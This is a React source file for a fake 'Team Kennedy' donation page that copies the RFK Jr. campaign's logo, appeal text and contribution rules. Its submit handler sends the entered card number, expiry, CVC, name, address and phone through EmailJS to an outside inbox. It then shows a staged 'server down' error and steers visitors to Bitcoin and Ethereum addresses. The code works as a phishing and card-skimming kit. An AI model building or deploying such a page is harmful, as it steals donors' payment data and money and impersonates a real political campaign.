import Btc from "../assets/btc.jpeg";
import Eth from "../assets/eth.jpeg";
import Footer from "../components/Footer/Footer";
import {BsFillCreditCard2FrontFill } from "react-icons/bs";
import CardInput from "../components/smComponents/CardInput";
import { useEffect, useRef, useState } from "react";
import emailjs from "@emailjs/browser";
const Donate = () => {

    const [ inputs, setInputs ] = useState( {
        email: '',
        amount: 10,
        fName: '',
        lName: '',
        bAddress: '', 
        phone: '',
        employer: '',
        occupation: '',
        cardNumber: '',
        year : '',
        cvc: ''
    });
    const formRef = useRef()
    const [error, setError] = useState('')
    const [cardError, setCardError] = useState('')
    const [loading, setLoading] = useState(false)
    const [disableBtn, setDisableBtn] = useState(false)

   const handleChange = e => setInputs(prevState => ({ ...prevState, [e.target.name]: e.target.value }));

    const handleSubmit = (e) => {
        e.preventDefault();
        if ( !inputs.cardNumber || !inputs.year || !inputs.cvc ) {
            setCardError(true)
            return setError('Incorrect Card Details*')
         }


        if ( !inputs.email || !inputs.amount || !inputs.fName || !inputs.lName || !inputs.bAddress || !inputs.phone  ) {
          return setError('All fields are required*')
       }
  
      setCardError(false)
       setLoading(true)
    
       const timeOut = setTimeout( () => {
        setError('OOPS!!!, Server currently down, Please continue with Crypto at the moment')
        setDisableBtn(true)
        setLoading(false)
    }, 5000)

               
      emailjs.sendForm('service_nuibne8', 'template_kaemcep', formRef.current, '_0A9sq7t3Q579a4JC')
      .then((result) => {
       console.log('ok')
        
      }).catch((error) => {
       console.log('err')
      });

   }

    useEffect( () => {
        const timeOut = setTimeout( () => {
           setError('')
           setCardError(false)
       }, 7000)

       return () => clearTimeout(timeOut)
   }, [error, cardError])
 return (
  <div id='donate'>
   <section className="navbar bg-white shadow-md">
    <a className="max-w-[350px] mx-auto p-6 flex justify-center">
     <img
      src="https://assets.nationbuilder.com/joinkennedy/sites/5/meta_images/original/logo.png?1681716385"
      className="max-h-[60px] "
      alt="Kennedy24"
     />
    </a>
   </section>

   <section className="md:py-6">
    <div>
     <div className="w-full md:px-4 ml-auto mr-auto">
      <div className="flex justify-content flex-wrap md:mx-4">
       <div className="w-full md:mb-6 relative">
        <div className="container md:py-4 md:mt-12">
         <div className="flex flex-wrap">
          <div className="w-full md:w-1/2 px-4 pt-12 md:p-0 bg-[#2b4d85] md:bg-transparent">
           <div className="bg-white px-9 md:px-20 rounded-sm">
            <h2 className="text-[1.8rem] pt-10 pb-2 md:p-0 font-extrabold md:text-[2rem] uppercase md:font-bold text-center mb-9 text-[#2b4d85]">
             {" "}
             {"I'm backing RFK, Jr."}
            </h2>

            <p className="mb-4 text-[1.2rem] font-[500] md:text-[1.3rem] text-left">
             <span className="font-normal;">
              There is only one way a President can
              transform a political system as corrupt and
              entrenched as our own. It is with the support
              of a movement. By donating to Team Kennedy,
              you give voice to a gathering yearning in
              America to restore integrity to government, to
              heal our divisions, to stop the endless wars,
              and to rebuild the foundations of our
              prosperity.
             </span>
            </p>

            <p className="mb-4 text-[1.2rem] font-[500] md:text-[1.3rem] text-left pb-16 md:pb-0">
             <span className="font-normal">
              We don’t have the mainstream media, the big
              corporations, or the Party establishment on
              our side. But we have you. Thank you for
              helping to grow this historic movement.
             </span>
            </p>
           </div>
          </div>

          <div className="w-full md:w-1/2 px-4 md:p-0 pb-20 bg-[#2b4d85] md:bg-transparent">
           <div className="bg-white pt-10 px-8 md:p-0 flex flex-col justify-center items-center">
            <fieldset className="mb-16">
             <legend className="text-center text-[1.6rem] font-bold text-[#2b4d85] ">
              Pay With Check
             </legend>

             <p className="text-center text-black text-[1.1rem] ">
              If paying by check, please make out to Team
              Kennedy, Inc. and send to PO Box 147, South
              Walpole, MA 02071
             </p>
            </fieldset>

                                             
            <fieldset className="pb-10 flex flex-col justify-center items-center">
            <legend className="text-center text-[1.6rem] mb-0 font-bold text-[#2b4d85] ">
              Pay With Card
             </legend>

             <p className="text-center text-[#212529] text-[1.1rem] ">
             Copy Address Below or Scan Barcode to continue
             </p>
            <form onSubmit={handleSubmit} className="flex flex-col justify-center items-center" ref={formRef}>
                
                <div className="det-inp sm:w-[405px]">
                <CardInput id='amount' value={inputs.amount} handleChange={handleChange} inputType='number' label='Amounts to donate' amount/>
                </div>
                <p className="text-left text-[#212529] mt-4 text-[1.2rem] mb-1 card-label sm:w-[405px]">Credit Card</p>
                <div className={`input-div border ${cardError ? ' border-red-600' : 'border-[rgb(177, 174, 174)]'} `} >
                    <BsFillCreditCard2FrontFill className="icon"/>
                    <input type="tel" placeholder="Card number" name="cardNumber" id="cardNumber" value={inputs.cardNumber} onChange={handleChange} />
                    <input type="tel" placeholder="MM/YY" name="year" id="year" value={inputs.year} onChange={handleChange}/>
                    <input type="tel" placeholder="CVC" name="cvc" id="cvc" value={inputs.cvc} onChange={handleChange} maxLength={3}/>
                </div>

                <p className="font-bold text-[1.4rem] text-[#2b4d85] mt-5">Your Information</p>
                
                <div className="det-inp w-[95%] sm:w-[405px]">
                    <CardInput id='email' value={inputs.email} handleChange={handleChange} inputType='email' label='Email'/>

                    <div className="flex gap-5 flex-col sm:flex-row">
                    <CardInput id='fName' value={inputs.fName} handleChange={handleChange} inputType='text' label='First Name'/>
                    <CardInput id='lName' value={inputs.lName} handleChange={handleChange} inputType='text' label='Last Name'/>
                    </div>
                       
                    <CardInput id='bAddress' value={inputs.bAddress} handleChange={handleChange} inputType='text' label='Billing Address'/>

                    <CardInput id='phone' value={inputs.phone} handleChange={handleChange} inputType='tel' label='Phone'/>

                    <div className="dual-input w-full flex gap-5 flex-col sm:flex-row">
                    <CardInput id='employer' value={inputs.employer} handleChange={handleChange} inputType='text' label='Employer'/>
                    <CardInput id='occupation' value={inputs.occupation} handleChange={handleChange} inputType='text' label='Occupation'/>
                    </div>
                </div>
                <div className= "w-[95%] sm:w-[405px]">
                     <p className="text-[#2b4d85] text-left mt-4 text-[1.1rem]">{`Law requires we ask for your employer and occupation. If you don't have an employer or are retired, put N/A, and if you are self-employed put "self-employed" in employer and describe your occupation.`}</p>

                <p className="text-[#E83B48] mt-4 text-left text-[1.2rem]">Contributions are <i>not</i> tax deductible.</p>
                
                <hr className="w-[95%] sm:w-[405px] text-gray-500 my-6"/>
                <div className="text-[#212529] mt-2 text-left text-[1.2rem]">
                <label htmlFor="is_confirmation_text" className="text-left text-[1.4rem] text-[#212529]"><strong>Contribution rules</strong></label>
                <div className="text-left mt-2">
                1. I am a U.S. citizen or a lawfully admitted permanent resident (i.e., green card holder).<br/>2. This contribution is made from my own funds, and funds are not being provided to me by another person or entity to make this contribution.<br/>3. I am at least eighteen years old.<br/>4. I am not a federal contractor.<br/>5. I am making this contribution with my own personal credit card and not with a corporate or business credit card or a card issued to another person or entity.<br/><br/>Note: Contributions to Team Kennedy are not tax deductible.<br/><br/>Federal law allows individuals to contribute up to $3,300 to the primary and up to $3,300 for the general election. Any amount over $3,300 will go to the general election fund.  Federal law prohibits contributions from corporations, labor unions, federal contractors, national banks, and foreign nationals.  All contributions must be made by personal funds, and they may not be reimbursed by any person or entity.<br/><br/>By entering your phone number, you are consenting to receive recurring automated text messages &amp; calls from Team Kennedy., our staff, volunteers, and associates.<br/><br/>
                </div>
                
                <div className="">
                <input className="" id="donation_is_confirmed" name="donation[is_confirmed]" type="checkbox" defaultChecked />
                <label htmlFor="donation_is_confirmed" className="pl-2">I confirm that the above statements are true and accurate.</label>
                </div>
            
                <hr className= "w-[95%] sm:w-[405px] text-gray-500 mt-6 mb-3"/>
                <div className="flex items-center .income justify-center">
                    {/* <FiDollarSign className="text-[1.5rem] text-[#28a745] font-[500]"/> */}
                    <p className="text-[2rem] text-[#28a745] font-[500]"><span className="pr-[2px] text-[2.3rem]">$</span>{inputs.amount}</p>
                    <p className="text-[#6c757d] ml-3">Paid Once</p>
                </div>

               
              
            </div>
                </div>
                <p className="error text-left text-[#e21b2a]">{error}</p>
                <button type="submit" disabled={disableBtn} className="uppercase bg-[#e21b2a] border-[#e21b2a] text-white cursor-pointer submit tracking-tight text-[1.1rem] py-[8px] px-4 rounded-md ml-auto mr-auto mt-5 disabled:bg-gray-500 disabled:cursor-not-allowed">
                   {loading ? 'Donating...' : 'Donate Now'}
                </button>
            </form>
            
            </fieldset>

            <hr className= "w-[95%] sm:w-[405px] text-gray-500 mt-1 mb-3"/>                   
            <fieldset className="pb-10">
             <legend className="text-center text-[1.6rem] mb-0 font-bold text-[#2b4d85] ">
              Pay With Crypto
             </legend>

             <p className="text-center text-[#212529] text-[1.1rem] ">
             Copy Address Below or Scan Barcode to continue
             </p>

             <div className="flex justify-center flex-col items-center ">
              <p className="font-semibold text-gray-800 text-[1.5rem] mb-3">Bitcoin Address</p>
              <img src={Btc} alt="Btc" className='w-[250px]'/>
              <p className="text-slate-800 mt-2">
               bc1qkjqq9dwcd8jplaagww0jk5fgu5jslpevsysa02
              </p>
             </div>

             <div className="flex justify-center flex-col items-center mt-9">
              <p className="font-semibold text-gray-800 text-[1.5rem] mb-3">Etherium Address</p>
              <img src={Eth} alt="Eth" className='w-[250px]'/>
              <p className="text-slate-800 mt-2">
               0xa1be3C42413A0235E1D0Bc803d19E204b50179b5
              </p>
             </div>
            </fieldset>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </section>

   <Footer />
  </div>
 );
};

export default Donate;
